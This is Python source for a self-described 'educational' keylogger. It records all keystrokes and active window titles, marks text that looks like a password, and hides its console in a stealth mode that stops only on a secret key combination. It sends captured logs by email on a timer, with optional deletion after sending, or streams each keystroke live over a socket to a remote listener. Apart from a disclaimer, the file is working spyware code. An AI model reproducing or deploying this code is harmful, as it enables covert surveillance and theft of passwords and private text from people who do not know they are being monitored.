"""
EDUCATIONAL KEYLOGGER PROJECT
==============================
WARNING: This software is for EDUCATIONAL PURPOSES ONLY.
Unauthorized use of keyloggers is ILLEGAL and unethical.
Only use this software on systems you own or have explicit permission to monitor.
The author is not responsible for any misuse of this software.
==============================
"""

from pynput import keyboard, mouse
from datetime import datetime
import os
import platform
import re
import argparse
import threading
import time
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Import email transmitter if available
try:
    from email_transmitter import EmailTransmitter
    EMAIL_AVAILABLE = True
except ImportError:
    EMAIL_AVAILABLE = False

# Import network transmitter if available
try:
    from network_transmitter import NetworkTransmitter
    NETWORK_AVAILABLE = True
except ImportError:
    NETWORK_AVAILABLE = False


class KeyLogger:
    """
    A keylogger class that captures and processes keyboard input intelligently.
    """

    def __init__(self, log_dir="logs", max_file_size_kb=100, stealth_mode=False,
                 enable_transmission=False, transmission_interval=30,
                 enable_network=False, network_host=None, network_port=9999):
        self.log_buffer = []
        self.current_modifiers = set()
        self.start_time = datetime.now()
        self.log_dir = log_dir
        self.max_file_size_bytes = max_file_size_kb * 1024
        self.current_log_file = None
        self.session_id = self.start_time.strftime("%Y%m%d_%H%M%S")
        self.stealth_mode = stealth_mode
        self.should_stop = False

        # Transmission settings
        self.enable_transmission = enable_transmission
        self.transmission_interval = transmission_interval * 60  # Convert to seconds
        self.last_transmission = datetime.now()
        self.transmission_thread = None
        self.email_transmitter = None
        self.network_transmitter = None

        # Network transmission settings
        self.enable_network = enable_network
        self.network_host = network_host
        self.network_port = network_port
        self.network_socket = None  # Persistent connection
        self.network_connected = False

        # Initialize email transmitter if enabled
        if self.enable_transmission and EMAIL_AVAILABLE:
            self._init_email_transmitter()

        # Initialize network transmitter if enabled
        if self.enable_network and NETWORK_AVAILABLE:
            self._init_network_transmitter()

        # Stealth mode: secret key combination to stop (Ctrl+Shift+Esc)
        self.secret_stop_combination = {keyboard.Key.ctrl, keyboard.Key.shift, keyboard.Key.esc}
        self.currently_pressed = set()

        # Enhanced tracking
        self.current_window = ""
        self.current_text_buffer = ""
        self.window_change_count = 0
        self.last_window_check = datetime.now()
        self.sentences = []
        self.potential_passwords = []

        # Create logs directory if it doesn't exist
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)

        # Initialize log files
        self._create_new_log_file()
        self._write_session_header()

        # Create readable summary file
        self.summary_file = os.path.join(self.log_dir, f"summary_session_{self.session_id}.txt")
        self._init_summary_file()

        # Hide console if in stealth mode
        if self.stealth_mode:
            self._hide_console()

        # Start transmission thread if enabled
        if self.enable_transmission and self.email_transmitter:
            self._start_transmission_thread()
        elif self.enable_network and self.network_transmitter:
            self._send_network_session_info()

    def _hide_console(self):
        """Hide the console window (Windows only)."""
        try:
            if platform.system() == "Windows":
                import ctypes
                # Get console window handle
                console_window = ctypes.windll.kernel32.GetConsoleWindow()
                if console_window:
                    # SW_HIDE = 0
                    ctypes.windll.user32.ShowWindow(console_window, 0)
        except Exception:
            pass

    def _log_stealth_message(self, message):
        """Log message only to file in stealth mode, or to console in normal mode."""
        if self.stealth_mode:
            # In stealth mode, don't write anything (already written by _write_to_file)
            pass
        else:
            # In normal mode, print to console
            print(message, end='', flush=True)

    def _init_summary_file(self):
        """Initialize the human-readable summary file."""
        header = f"""
{'='*80}
KEYLOGGER SESSION SUMMARY - HUMAN READABLE FORMAT
{'='*80}
Session ID: {self.session_id}
Start Time: {self.start_time.strftime("%Y-%m-%d %H:%M:%S")}
System: {platform.system()} {platform.release()}
{'='*80}

This file contains a reconstructed view of user activity for easy analysis.

"""
        try:
            with open(self.summary_file, 'w', encoding='utf-8') as f:
                f.write(header)
        except Exception:
            pass

    def _write_to_summary(self, content):
        """Write to the human-readable summary file."""
        try:
            with open(self.summary_file, 'a', encoding='utf-8') as f:
                f.write(content)
        except Exception:
            pass

    def _check_window_change(self):
        """Check if the active window has changed and log it."""
        current_time = datetime.now()
        # Check window every 0.5 seconds to avoid performance issues
        if (current_time - self.last_window_check).total_seconds() > 0.5:
            new_window = self._get_active_window_title()
            if new_window != self.current_window and new_window != "Unknown":
                self.last_window_check = current_time

                # Save previous text buffer if it exists
                if self.current_text_buffer.strip():
                    self._save_text_entry()

                self.current_window = new_window
                self.window_change_count += 1

                timestamp = self.get_timestamp()
                window_log = f"\n{'='*80}\n[{timestamp}] WINDOW CHANGED: {new_window}\n{'='*80}\n"

                self._write_to_file(window_log)
                self._write_to_summary(window_log)

                if not self.stealth_mode:
                    print(f"\n\n[WINDOW: {new_window}]\n", end='', flush=True)

    def _save_text_entry(self):
        """Save the current text buffer as a complete entry."""
        if not self.current_text_buffer.strip():
            return

        timestamp = self.get_timestamp()

        # Detect potential password (text with no spaces and special chars)
        is_potential_password = self._is_potential_password(self.current_text_buffer)

        if is_potential_password:
            entry = f"\n[{timestamp}] [POTENTIAL PASSWORD] >>> {self.current_text_buffer} <<<\n"
            self.potential_passwords.append({
                'time': timestamp,
                'window': self.current_window,
                'text': self.current_text_buffer
            })
        else:
            entry = f"\n[{timestamp}] TEXT TYPED: {self.current_text_buffer}\n"
            self.sentences.append({
                'time': timestamp,
                'window': self.current_window,
                'text': self.current_text_buffer
            })

        self._write_to_summary(entry)
        self.current_text_buffer = ""

    def _is_potential_password(self, text):
        """Detect if text might be a password."""
        if len(text) < 4:
            return False

        # Passwords often have:
        # - No spaces
        # - Mix of letters and numbers
        # - Special characters
        has_no_spaces = ' ' not in text
        has_numbers = bool(re.search(r'\d', text))
        has_special = bool(re.search(r'[!@#$%^&*()_+\-=\[\]{};:\'",.<>?/\\|`~]', text))
        has_mixed_case = text != text.lower() and text != text.upper()

        # If it has at least 2 of these characteristics, might be a password
        indicators = sum([has_numbers, has_special, has_mixed_case])

        return has_no_spaces and indicators >= 2

    def _create_new_log_file(self):
        """Create a new log file with timestamp."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"keylog_session_{self.session_id}_part_{timestamp}.txt"
        self.current_log_file = os.path.join(self.log_dir, filename)

    def _check_file_rotation(self):
        """Check if current log file exceeds size limit and rotate if needed."""
        if os.path.exists(self.current_log_file):
            file_size = os.path.getsize(self.current_log_file)
            if file_size >= self.max_file_size_bytes:
                self._write_to_file("\n" + "="*60 + "\n")
                self._write_to_file("[FILE ROTATION - SIZE LIMIT REACHED]\n")
                self._write_to_file("="*60 + "\n\n")
                self._create_new_log_file()
                self._write_session_header()

    def _write_session_header(self):
        """Write session information header to log file."""
        header = f"""
{'='*60}
KEYLOGGER SESSION LOG
{'='*60}
Session ID: {self.session_id}
Start Time: {self.start_time.strftime("%Y-%m-%d %H:%M:%S")}
System: {platform.system()} {platform.release()}
Machine: {platform.machine()}
Python Version: {platform.python_version()}
{'='*60}

"""
        self._write_to_file(header)

    def _write_to_file(self, content):
        """Write content to the current log file."""
        try:
            with open(self.current_log_file, 'a', encoding='utf-8') as f:
                f.write(content)
        except Exception as e:
            pass

    def _get_active_window_title(self):
        """Get the title of the currently active window (Windows only)."""
        try:
            if platform.system() == "Windows":
                import ctypes
                import ctypes.wintypes

                # Get foreground window
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                return buff.value if buff.value else "Unknown"
            else:
                return "N/A (Non-Windows System)"
        except Exception:
            return "Unknown"

    def get_timestamp(self):
        """Generate a formatted timestamp for each event."""
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def process_special_key(self, key):
        """
        Process special keys and return a readable format.
        """
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
            keyboard.Key.home: "[HOME]",
            keyboard.Key.end: "[END]",
            keyboard.Key.page_up: "[PAGE_UP]",
            keyboard.Key.page_down: "[PAGE_DOWN]",
            keyboard.Key.caps_lock: "[CAPS_LOCK]",
            keyboard.Key.num_lock: "[NUM_LOCK]",
            keyboard.Key.scroll_lock: "[SCROLL_LOCK]",
            keyboard.Key.insert: "[INSERT]",
            keyboard.Key.pause: "[PAUSE]",
            keyboard.Key.print_screen: "[PRINT_SCREEN]",
        }

        return special_keys.get(key, f"[{str(key).replace('Key.', '').upper()}]")

    def on_press(self, key):
        """
        Callback function when a key is pressed.
        Handles regular keys, special keys, and modifiers.
        """
        try:
            timestamp = self.get_timestamp()

            # Track pressed keys for secret combination FIRST
            self.currently_pressed.add(key)

            # Check for secret stop combination in stealth mode BEFORE processing modifiers
            if self.stealth_mode:
                # Check if we have Ctrl, Shift, and Esc all pressed
                has_ctrl = any(k in self.currently_pressed for k in [keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l])
                has_shift = any(k in self.currently_pressed for k in [keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l])
                has_esc = keyboard.Key.esc in self.currently_pressed

                if has_ctrl and has_shift and has_esc:
                    self._write_to_file(f"\n\n[{timestamp}] [SECRET STOP COMBINATION DETECTED - KEYLOGGER STOPPED]\n")
                    self._write_session_footer()
                    return False

            # Check for window changes
            self._check_window_change()

            # Track and log modifier keys
            if key in [keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l]:
                if "SHIFT" not in self.current_modifiers:
                    self.current_modifiers.add("SHIFT")
                    log_entry = f"[{timestamp}] [SHIFT]"
                    self.log_buffer.append(log_entry)
                    self._write_to_file(log_entry)
                    self._log_stealth_message(log_entry)
                return
            elif key in [keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l]:
                if "CTRL" not in self.current_modifiers:
                    self.current_modifiers.add("CTRL")
                    log_entry = f"[{timestamp}] [CTRL]"
                    self.log_buffer.append(log_entry)
                    self._write_to_file(log_entry)
                    self._log_stealth_message(log_entry)
                return
            elif key in [keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.alt_l]:
                if "ALT" not in self.current_modifiers:
                    self.current_modifiers.add("ALT")
                    log_entry = f"[{timestamp}] [ALT]"
                    self.log_buffer.append(log_entry)
                    self._write_to_file(log_entry)
                    self._log_stealth_message(log_entry)
                return
            elif key == keyboard.Key.cmd or key == keyboard.Key.cmd_r:
                if "WIN" not in self.current_modifiers:
                    self.current_modifiers.add("WIN")
                    log_entry = f"[{timestamp}] [WIN]"
                    self.log_buffer.append(log_entry)
                    self._write_to_file(log_entry)
                    self._log_stealth_message(log_entry)
                return

            # Process regular character keys
            if hasattr(key, 'char') and key.char is not None:
                char = key.char

                # Add modifier prefix if any modifiers are active
                if self.current_modifiers:
                    modifier_str = "+".join(sorted(self.current_modifiers))
                    log_entry = f"[{timestamp}] [{modifier_str}+{char}]"
                    display_entry = log_entry
                else:
                    log_entry = char
                    display_entry = char
                    # Add to text buffer for reconstruction
                    self.current_text_buffer += char

                self.log_buffer.append(log_entry)
                self._write_to_file(log_entry)
                self._log_stealth_message(display_entry)

            # Process special keys
            else:
                special_key_str = self.process_special_key(key)

                # Handle special keys that affect text buffer
                if key == keyboard.Key.space:
                    self.current_text_buffer += " "
                elif key == keyboard.Key.enter:
                    # Save the current text entry on Enter
                    self._save_text_entry()
                    special_key_str = "[ENTER]\n"
                elif key == keyboard.Key.backspace:
                    # Remove last character from buffer
                    if self.current_text_buffer:
                        self.current_text_buffer = self.current_text_buffer[:-1]
                elif key == keyboard.Key.tab:
                    # Tab often indicates moving to next field (potential password field)
                    if self.current_text_buffer.strip():
                        self._save_text_entry()

                if self.current_modifiers:
                    modifier_str = "+".join(sorted(self.current_modifiers))
                    log_entry = f"[{timestamp}] [{modifier_str}+{special_key_str}]"
                else:
                    log_entry = f"[{timestamp}] {special_key_str}"

                self.log_buffer.append(log_entry)
                self._write_to_file(log_entry)
                self._log_stealth_message(log_entry)

            # Check for file rotation
            self._check_file_rotation()

            # Send individual keystroke to network in real-time if network transmission is enabled
            if self.enable_network and self.network_connected:
                key_value = str(key).replace("'", "")  # Clean up the key representation
                self._send_keystroke_to_network(key_value, timestamp)

        except Exception as e:
            pass

    def on_release(self, key):
        """
        Callback function when a key is released.
        Tracks when modifier keys are released.
        """
        # Remove from currently pressed set
        self.currently_pressed.discard(key)

        # Remove modifier from active set when released
        if key in [keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l]:
            self.current_modifiers.discard("SHIFT")
        elif key in [keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l]:
            self.current_modifiers.discard("CTRL")
        elif key in [keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.alt_l]:
            self.current_modifiers.discard("ALT")
        elif key == keyboard.Key.cmd or key == keyboard.Key.cmd_r:
            self.current_modifiers.discard("WIN")

        # Stop listener with ESC key (only in normal mode)
        if key == keyboard.Key.esc and not self.stealth_mode:
            self._write_session_footer()
            print("\n\n[KEYLOGGER STOPPED]")
            return False

    def _write_session_footer(self):
        """Write session end information to log file."""
        end_time = datetime.now()
        duration = end_time - self.start_time

        # Save any remaining text
        if self.current_text_buffer.strip():
            self._save_text_entry()

        # Disconnect persistent socket if active
        if self.enable_network:
            self._disconnect_persistent_socket()

        footer = f"""

{'='*60}
SESSION END
{'='*60}
End Time: {end_time.strftime("%Y-%m-%d %H:%M:%S")}
Duration: {duration}
Total Keys Captured: {len(self.log_buffer)}
Windows Visited: {self.window_change_count}
Text Entries Captured: {len(self.sentences)}
Potential Passwords Detected: {len(self.potential_passwords)}
{'='*60}
"""
        self._write_to_file(footer)
        self._write_session_summary()

    def _write_session_summary(self):
        """Write a complete session summary with statistics."""
        end_time = datetime.now()
        duration = end_time - self.start_time

        summary = f"""

{'='*80}
FINAL SESSION STATISTICS
{'='*80}
Total Duration: {duration}
Total Keys Pressed: {len(self.log_buffer)}
Different Windows Used: {self.window_change_count}
Text Entries Captured: {len(self.sentences)}
Potential Passwords Found: {len(self.potential_passwords)}
{'='*80}

"""
        self._write_to_summary(summary)

        # List all potential passwords found
        if self.potential_passwords:
            summary += "\n⚠️  POTENTIAL PASSWORDS DETECTED:\n"
            summary += "="*80 + "\n"
            for i, pwd in enumerate(self.potential_passwords, 1):
                summary += f"\n{i}. Time: {pwd['time']}\n"
                summary += f"   Window: {pwd['window']}\n"
                summary += f"   Text: {pwd['text']}\n"
            summary += "\n" + "="*80 + "\n"
            self._write_to_summary(summary)

        # List all text entries
        if self.sentences:
            summary = f"\n📝 ALL TEXT ENTRIES:\n{'='*80}\n"
            for i, entry in enumerate(self.sentences, 1):
                summary += f"\n{i}. [{entry['time']}] [{entry['window']}]\n"
                summary += f"   {entry['text']}\n"
            summary += "\n" + "="*80 + "\n"
            self._write_to_summary(summary)

    def _init_email_transmitter(self):
        """Initialize the email transmitter with configuration from .env file."""
        try:
            smtp_server = os.getenv('SMTP_SERVER')
            smtp_port = int(os.getenv('SMTP_PORT', 587))
            smtp_email = os.getenv('SMTP_EMAIL')
            smtp_password = os.getenv('SMTP_PASSWORD')
            recipient_email = os.getenv('RECIPIENT_EMAIL')
            encryption_enabled = os.getenv('ENCRYPTION_ENABLED', 'False').lower() == 'true'
            encryption_key = os.getenv('ENCRYPTION_KEY')

            if not all([smtp_server, smtp_email, smtp_password, recipient_email]):
                print("[WARNING] Email configuration incomplete. Transmission disabled.")
                self.enable_transmission = False
                return

            self.email_transmitter = EmailTransmitter(
                smtp_server=smtp_server,
                smtp_port=smtp_port,
                sender_email=smtp_email,
                sender_password=smtp_password,
                recipient_email=recipient_email,
                encryption_enabled=encryption_enabled,
                encryption_key=encryption_key
            )

            # Test connection in normal mode
            if not self.stealth_mode:
                print("[INFO] Testing email connection...")
                if self.email_transmitter.test_connection():
                    print(f"[SUCCESS] Email transmission enabled. Interval: {self.transmission_interval // 60} minutes")
                else:
                    print("[WARNING] Email connection test failed. Check your configuration.")
                    self.enable_transmission = False

        except Exception as e:
            print(f"[ERROR] Failed to initialize email transmitter: {e}")
            self.enable_transmission = False

    def _init_network_transmitter(self):
        """Initialize the network transmitter with configuration from .env file."""
        try:
            if not all([self.network_host, self.network_port]):
                print("[WARNING] Network configuration incomplete. Transmission disabled.")
                self.enable_network = False
                return

            self.network_transmitter = NetworkTransmitter(
                server_host=self.network_host,
                server_port=self.network_port
            )

            # Test connection in normal mode
            if not self.stealth_mode:
                print("[INFO] Testing network connection...")
                if self.network_transmitter.test_connection():
                    print(f"[SUCCESS] Network transmission enabled. Target: {self.network_host}:{self.network_port}")
                    # Establish persistent connection for real-time transmission
                    print("[INFO] Establishing persistent connection...")
                    if self._connect_persistent_socket():
                        print("[SUCCESS] Persistent connection established. Ready for real-time transmission.")
                    else:
                        print("[WARNING] Failed to establish persistent connection.")
                        self.enable_network = False
                else:
                    print("[WARNING] Network connection test failed. Is the listener server running?")
                    self.enable_network = False
            else:
                # In stealth mode, silently try to connect
                if self.network_transmitter.test_connection():
                    self._connect_persistent_socket()
                else:
                    self.enable_network = False

        except Exception as e:
            print(f"[ERROR] Failed to initialize network transmitter: {e}")
            self.enable_network = False

    def _start_transmission_thread(self):
        """Start a background thread for periodic transmission."""
        self.transmission_thread = threading.Thread(target=self._transmission_loop, daemon=True)
        self.transmission_thread.start()

        if not self.stealth_mode:
            print(f"[INFO] Transmission thread started. Next transmission in {self.transmission_interval // 60} minutes")

    def _transmission_loop(self):
        """Background loop for periodic email transmission."""
        while not self.should_stop:
            time.sleep(60)  # Check every minute

            # Check if it's time to transmit
            elapsed = (datetime.now() - self.last_transmission).total_seconds()
            if elapsed >= self.transmission_interval:
                self._transmit_logs()
                self.last_transmission = datetime.now()

    def _transmit_logs(self):
        """Transmit current log files via email."""
        if not self.email_transmitter:
            return

        try:
            # Get all log files for this session
            log_files = []
            if os.path.exists(self.log_dir):
                for filename in os.listdir(self.log_dir):
                    if filename.startswith(f"keylog_session_{self.session_id}") or \
                       filename.startswith(f"summary_session_{self.session_id}"):
                        log_files.append(os.path.join(self.log_dir, filename))

            if log_files:
                if not self.stealth_mode:
                    print(f"\n[TRANSMISSION] Sending {len(log_files)} log file(s)...")

                success = self.email_transmitter.send_logs(log_files, self.session_id)

                if success:
                    transmission_log = f"\n[{self.get_timestamp()}] [TRANSMISSION SUCCESS] Sent {len(log_files)} file(s)\n"
                    self._write_to_file(transmission_log)

                    if not self.stealth_mode:
                        print(f"[SUCCESS] Logs transmitted successfully!")

                    # Delete logs after successful transmission if configured
                    if os.getenv('AUTO_DELETE_AFTER_SEND', 'False').lower() == 'true':
                        for log_file in log_files:
                            try:
                                os.remove(log_file)
                            except:
                                pass
                else:
                    transmission_log = f"\n[{self.get_timestamp()}] [TRANSMISSION FAILED]\n"
                    self._write_to_file(transmission_log)

                    if not self.stealth_mode:
                        print(f"[ERROR] Transmission failed. Will retry in {self.transmission_interval // 60} minutes.")

        except Exception as e:
            error_log = f"\n[{self.get_timestamp()}] [TRANSMISSION ERROR] {str(e)}\n"
            self._write_to_file(error_log)

            if not self.stealth_mode:
                print(f"[ERROR] Transmission error: {e}")

    def _send_network_session_info(self):
        """Send session information over the network."""
        if not self.network_connected:
            return

        try:
            session_data = {
                'session_id': self.session_id,
                'start_time': self.start_time.strftime('%Y-%m-%d %H:%M:%S'),
                'system': platform.system(),
                'machine': platform.machine(),
                'release': platform.release()
            }

            message = {
                'type': 'session_info',
                'timestamp': datetime.now().isoformat(),
                'data': session_data
            }

            self._send_via_persistent_socket(message)

            if not self.stealth_mode:
                print(f"[INFO] Network session info sent to {self.network_host}:{self.network_port}")

        except Exception:
            pass

    def _send_keystroke_to_network(self, key_value, timestamp):
        """Send a single keystroke to the network in real-time via persistent connection."""
        if not self.network_connected:
            return

        try:
            keystroke_data = {
                'key': key_value,
                'window': self.current_window,
                'timestamp': timestamp,
                'modifiers': list(self.current_modifiers) if self.current_modifiers else []
            }

            message = {
                'type': 'keystroke',
                'timestamp': datetime.now().isoformat(),
                'data': keystroke_data
            }

            self._send_via_persistent_socket(message)
        except Exception:
            # If connection fails, try to reconnect
            if not self._connect_persistent_socket():
                self.network_connected = False

    def _send_via_persistent_socket(self, message):
        """Send a message via the persistent socket connection."""
        try:
            import json
            data = json.dumps(message).encode('utf-8')
            data_size = len(data).to_bytes(4, byteorder='big')

            self.network_socket.sendall(data_size)
            self.network_socket.sendall(data)

            # Wait for acknowledgment
            response = self.network_socket.recv(1024).decode('utf-8')
            return response == 'OK'
        except Exception:
            self.network_connected = False
            return False

    def _connect_persistent_socket(self):
        """Establish a persistent socket connection to the network server."""
        try:
            import socket
            self.network_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.network_socket.settimeout(5)
            self.network_socket.connect((self.network_host, self.network_port))
            self.network_connected = True
            return True
        except Exception:
            self.network_connected = False
            if self.network_socket:
                try:
                    self.network_socket.close()
                except:
                    pass
                self.network_socket = None
            return False

    def _disconnect_persistent_socket(self):
        """Close the persistent socket connection."""
        if self.network_socket:
            try:
                # Send disconnect message
                disconnect_message = {
                    'type': 'disconnect',
                    'timestamp': datetime.now().isoformat(),
                    'data': {'session_id': self.session_id}
                }
                self._send_via_persistent_socket(disconnect_message)

                # Close the socket
                self.network_socket.close()
            except:
                pass
            finally:
                self.network_socket = None
                self.network_connected = False

    def on_mouse_click(self, x, y, button, pressed):
        """
        Callback function when a mouse click is detected.
        Stops the listener on left click, can be used to detect cursor position.
        """
        try:
            if pressed:
                # Stop the listener on left click (for stealth termination)
                self._write_to_file(f"\n\n[MOUSE CLICK DETECTED - POSSIBLE STEALTH TERMINATION]\n")
                self._write_session_footer()
                return False
        except Exception:
            pass

    def start(self):
        """
        Start the keylogger listener.
        """
        if self.stealth_mode:
            # Stealth mode: minimal output, hidden console
            self._write_to_file(f"\n[STEALTH MODE ACTIVATED]\n")
            self._write_to_file(f"[Secret stop combination: Ctrl+Shift+Esc]\n")
            self._write_to_file(f"[Started at: {self.get_timestamp()}]\n\n")
        else:
            # Normal mode: full console output
            print("="*60)
            print("EDUCATIONAL KEYLOGGER - PHASE 4 (Network Transmission)")
            print("="*60)
            print(f"Started at: {self.get_timestamp()}")
            print(f"Raw logs: {self.current_log_file}")
            print(f"Summary: {self.summary_file}")
            print("Press ESC to stop the keylogger")
            print("="*60)
            print("\nCapturing keystrokes:\n")

        # NOTE: Mouse listener removed due to pynput.mouse bug on Windows
        # The listener server will display navigation keys (arrows, backspace, etc.)
        # as markers for better understanding of user actions

        # Start listening to keyboard events
        try:
            with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            ) as listener:
                listener.join()
        except KeyboardInterrupt:
            # Handle Ctrl+C gracefully
            self._write_session_footer()
            if not self.stealth_mode:
                print("\n\n[KEYLOGGER STOPPED BY INTERRUPT]")

        if not self.stealth_mode:
            print(f"\n\nStopped at: {self.get_timestamp()}")
            print(f"Total keys captured: {len(self.log_buffer)}")
            print(f"Text entries: {len(self.sentences)}")
            print(f"Potential passwords: {len(self.potential_passwords)}")
            print(f"\nLogs saved to: {self.log_dir}/")
            print(f"📊 Check {self.summary_file} for readable summary!")


def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description='Educational Keylogger - For cybersecurity learning purposes only',
        epilog='WARNING: Unauthorized use is ILLEGAL and UNETHICAL'
    )

    parser.add_argument(
        '-s', '--stealth',
        action='store_true',
        help='Run in stealth mode (hidden console, secret stop combination: Ctrl+Shift+Esc)'
    )

    parser.add_argument(
        '-d', '--directory',
        type=str,
        default='logs',
        help='Directory for log files (default: logs)'
    )

    parser.add_argument(
        '-m', '--max-size',
        type=int,
        default=100,
        help='Maximum log file size in KB before rotation (default: 100)'
    )

    parser.add_argument(
        '-t', '--transmit',
        action='store_true',
        help='Enable email transmission of logs (requires .env configuration)'
    )

    parser.add_argument(
        '-i', '--interval',
        type=int,
        default=30,
        help='Transmission interval in minutes (default: 30)'
    )

    parser.add_argument(
        '-n', '--network',
        action='store_true',
        help='Enable network transmission to listener server'
    )

    parser.add_argument(
        '-H', '--host',
        type=str,
        help='Listener server host/IP address (required with --network)'
    )

    parser.add_argument(
        '-p', '--port',
        type=int,
        default=9999,
        help='Listener server port (default: 9999)'
    )

    return parser.parse_args()


def main():
    """
    Main entry point for the keylogger.
    """
    # Parse command line arguments
    args = parse_arguments()

    if not args.stealth:
        print(__doc__)

    # Create and start the keylogger
    keylogger = KeyLogger(
        log_dir=args.directory,
        max_file_size_kb=args.max_size,
        stealth_mode=args.stealth,
        enable_transmission=args.transmit,
        transmission_interval=args.interval,
        enable_network=args.network,
        network_host=args.host,
        network_port=args.port
    )
    keylogger.start()


if __name__ == "__main__":
    main()
